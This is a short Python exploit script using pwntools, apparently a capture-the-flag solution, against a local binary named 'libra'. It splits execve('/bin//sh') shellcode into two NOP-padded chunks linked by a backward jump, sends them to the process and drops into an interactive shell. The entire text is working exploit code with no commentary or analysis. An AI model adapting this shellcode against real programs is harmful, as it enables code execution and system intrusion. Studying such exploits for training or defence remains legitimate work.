from pwn import *

context.arch = 'amd64'
p = process('./libra')

part1 = asm(f"""
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
""").ljust(16, b'\x90')

part2 = asm(f"""
    xor rsi, rsi
    push rsi
    movabs rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    jmp $-34
""").ljust(20, b'\x90')

payload = part1 + part2

p.send(payload)
p.interactive()
